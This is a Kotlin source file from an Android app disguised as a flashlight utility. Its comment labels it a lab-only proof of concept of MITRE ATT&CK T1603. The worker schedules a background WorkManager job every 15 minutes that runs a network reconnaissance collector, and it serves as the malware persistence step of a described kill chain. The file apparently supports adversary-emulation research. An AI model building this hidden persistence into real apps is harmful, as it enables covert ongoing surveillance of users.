package com.utiltools.flashlight.schedule

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.utiltools.flashlight.recon.NetworkReconCollector
import java.util.concurrent.TimeUnit

/**
 * PoC-only. Self-built benign proof-of-concept, isolated lab only.
 * Implements ATT&CK Mobile T1603 (Scheduled Task/Job):
 * https://attack.mitre.org/techniques/T1603/
 *
 * Registers a periodic WorkManager job that re-runs recon in the
 * background, independent of the app being foregrounded — the persistence
 * mechanism the kill chain's install phase relies on. Evidence: inspect
 * with `adb shell dumpsys jobscheduler` while the app is installed.
 */
class ReconJobWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "PoC-T1603-Schedule"
        private const val WORK_NAME = "poc_recon_job"

        fun schedule(context: Context) {
            val request = PeriodicWorkRequestBuilder<ReconJobWorker>(
                15, TimeUnit.MINUTES // WorkManager's minimum periodic interval
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )

            Log.i(TAG, "scheduled_job registered name=$WORK_NAME interval_min=15")
        }
    }

    override suspend fun doWork(): Result {
        Log.i(TAG, "scheduled_job fired name=$WORK_NAME")
        NetworkReconCollector.collect(applicationContext)
        return Result.success()
    }
}
